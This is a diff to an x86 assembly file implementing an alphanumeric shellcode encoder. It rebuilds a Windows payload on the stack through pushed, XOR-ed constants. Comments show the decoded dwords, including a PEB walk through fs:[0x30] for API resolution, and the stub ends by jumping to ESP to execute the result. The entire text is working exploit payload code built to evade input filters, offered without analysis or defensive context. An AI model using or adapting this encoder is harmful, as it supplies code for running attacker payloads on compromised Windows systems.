@@ -14,303 +14,304 @@ register:
     push esp
     pop ecx
 encode:
-; push 0xf9eb585a
-    push 0x533f322c
+; push 0x90eb585a
+    push 0x58242866
     pop eax
-    xor eax, 0x552b6a76
+    xor eax, 0x3730703c
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0xe18bd2ff
-    push 0x37227c4a
+    xor [edx], bh
+; push 0x5ac3619d
+    push 0x667c4749
     pop eax
-    xor eax, 0x2956514a
+    xor eax, 0x3c40262b
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0x500a6ae0
-    push 0x2d2f4657
+    xor [edx], bh
+; push 0xe18b9d61
+    push ebx
     pop eax
-    xor eax, 0x7d252c48
+    xor eax, 0x762e2f2b
+    xor eax, 0x685a4d4a
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-; push 0x89212121
-    push 0x5b58446a
+    xor [edx], bh
+; push 0xd2ff500a
+    push 0x64216851
     pop eax
-    xor eax, 0x2d79654b
+    xor eax, 0x4921385b
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-; push 0x21242c81
-    push 0x4c4d704e
+    xor [edx], bh
+; push 0x6ae08921
+    push 0x5538426d
     pop eax
-    xor eax, 0x6d695c30
+    xor eax, 0x3f27344c
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-; push 0x848d8284
-    push 0x2b26474f
+    xor [edx], bh
+; push 0x21212124
+    push 0x6c537157
     pop eax
-    xor eax, 0x50543a34
+    xor eax, 0x4d725073
+    push eax
+; push 0x2c81848d
+    push ebx
+    pop eax
+    xor eax, 0x573d3221
+    xor eax, 0x7b434953
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0x68212121
-    push 0x3d6f5775
+    xor [edx], bh
+; push 0x82846821
+    push 0x263c3f47
     pop eax
-    xor eax, 0x554e7654
-; push 0x21242c81
-    push 0x54777e48
-    pop eax
-    xor eax, 0x75535236
+    xor eax, 0x5b475766
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-; push 0x21212121
-    push 0x59545273
+    xor [edx], bh
+; push 0x21212124
+    push 0x77414452
     pop eax
-    xor eax, 0x78757352
-; push 0x68da0188
-    push 0x326c3b2a
+    xor eax, 0x56606576
+    push eax
+; push 0x2c812121
+    push 0x7a38685d
     pop eax
-    xor eax, 0x5a493a5d
+    xor eax, 0x5646497c
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0x148b4a0c
-    push 0x225a7234
+    xor [edx], bh
+; push 0x212168da
+    push 0x5559595f
     pop eax
-    xor eax, 0x362e3838
+    xor eax, 0x7478317a
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-; push 0x8b66585a
-    push 0x3f496c2d
+    xor [edx], bh
+; push 0x0188148b
+    push 0x385e7847
     pop eax
-    xor eax, 0x4b2f3477
+    xor eax, 0x39296c33
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-; push 0xe0753c3e
-    push 0x26485354
+    xor [edx], bh
+; push 0x4a0c8b66
+    push 0x627e3149
     pop eax
-    xor eax, 0x393d6f6a
+    xor eax, 0x2872452f
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-; push 0x6889fa81
-    push 0x384d6558
+    xor [edx], bh
+; push 0x585ae075
+    push 0x29755e53
     pop eax
-    xor eax, 0x503b6026
+    xor eax, 0x712f4126
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0xf4ebc201
-    push 0x3f485378
+    xor [edx], bh
+; push 0x3c3e6889
+    push 0x6648573b
     pop eax
-    xor eax, 0x345c6e79
+    xor eax, 0x5a763f4d
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0x11cac107
-    push 0x4a6f4a4e
+    xor [edx], bh
+; push 0xfa81f4eb
+    push ebx
     pop eax
-    xor eax, 0x5b5a7449
+    xor eax, 0x2a2a254e
+    xor eax, 0x2f542e5a
+    push eax
+; push 0xc20111ca
+    push 0x473f4b65
+    pop eax
+    xor eax, 0x7a3e5a50
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0x74c084ac
-    push 0x3f4f306f
+    xor [edx], bh
+; push 0xc10774c0
+    push 0x5e693947
     pop eax
-    xor eax, 0x4b704b3c
+    xor eax, 0x606e4d78
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0xd231c031
-    push 0x45597453
+    xor [edx], bh
+; push 0x84acd231
+    push ebx
     pop eax
-    xor eax, 0x68684b62
+    xor eax, 0x256c5862
+    xor eax, 0x5e3f7553
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0xde018f34
-    push 0x6b2e5c7d
+    xor [edx], bh
+; push 0xc031de01
+    push 0x58616939
     pop eax
-    xor eax, 0x4a2f2c49
+    xor eax, 0x67504838
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0x8b494be3
-    push 0x2928763a
+    xor [edx], bh
+; push 0x8f348b49
+    push 0x4f79552b
     pop eax
-    xor eax, 0x5d613d26
+    xor eax, 0x3f4d2162
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0x52da0124
-    push 0x614d6b53
+    xor [edx], bh
+; push 0x4be352da
+    push 0x7a4d3d79
     pop eax
-    xor eax, 0x33686a77
+    xor eax, 0x31516f5c
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-; push 0x528bdf01
-    push 0x7a35735f
+    xor [edx], bh
+; push 0x0124528b
+    push 0x43563122
     pop eax
-    xor eax, 0x2841535e
+    xor eax, 0x42726356
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0x207a8b50
-    push 0x68313b6a
+    xor [edx], bh
+; push 0xdf01207a
+    push 0x5b734542
     pop eax
-    xor eax, 0x484b4f3a
+    xor eax, 0x7b726538
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-; push 0xd8011c42
-    push 0x4b573b23
+    xor [edx], bh
+; push 0x8b50d801
+    push 0x5c2d7468
     pop eax
-    xor eax, 0x6c562761
+    xor eax, 0x287d5369
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-; push 0x8b144a8b
-    push 0x48213822
+    xor [edx], bh
+; push 0x1c428b14
+    push 0x70325223
     pop eax
-    xor eax, 0x3c357256
+    xor eax, 0x6c702637
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0xda01781a
-    push 0x687a2d59
+    xor [edx], bh
+; push 0x4a8bda01
+    push 0x22564a6b
     pop eax
-    xor eax, 0x4d7b5543
+    xor eax, 0x68226f6a
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-; push 0x548b3c53
-    push 0x2249592b
+    xor [edx], bh
+; push 0x781a548b
+    push 0x46782e5b
     pop eax
-    xor eax, 0x763d6578
+    xor eax, 0x3e627a2f
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-; push 0x8b105b8b
-    push 0x22477039
+    xor [edx], bh
+; push 0x3c538b10
+    push 0x556b5e22
     pop eax
-    xor eax, 0x56572b4d
+    xor eax, 0x69382a32
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0x1b8b1b8b
-    push 0x2828405d
+    xor [edx], bh
+; push 0x5b8b1b8b
+    push 0x685f4929
     pop eax
-    xor eax, 0x335c5b29
+    xor eax, 0x332b525d
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-; push 0x145b8b0c
-    push 0x7a6a2d32
+    xor [edx], bh
+; push 0x1b8b145b
+    push 0x6c31317d
     pop eax
-    xor eax, 0x6e31593e
+    xor eax, 0x77452526
+    push eax
     push esp
     pop edx
-    inc edx
-    xor byte [edx], dl
-; push 0x5b8b305b
-    push 0x21475861
+    xor [edx], bh
+; push 0x8b0c5b8b
+    push 0x5d23795c
     pop eax
-    xor eax, 0x7a33683a
+    xor eax, 0x292f2228
+    push eax
     push esp
     pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-; push 0x8b64db31
-    push 0x3c356b4f
+    xor [edx], bh
+; push 0x305b8b64
+    push 0x766d244c
     pop eax
-    xor eax, 0x48514f7e
+    xor eax, 0x46365028
+    push eax
     push esp
     pop edx
+    xor [edx], bh
+; push 0xdb319c60
+    push 0x4156512d
+    pop eax
+    xor eax, 0x6567324d
+    push eax
+    push esp
+    pop edx
+    xor [edx], bh
     inc edx
-    xor byte [edx], dl
-    inc edx
-    xor byte [edx], dl
-retpre:
-    push ecx
-    pop esp
-    popfd
-    popad
-    ret
+    xor [edx], bh
+; jmp to shellcode
+    jmp esp
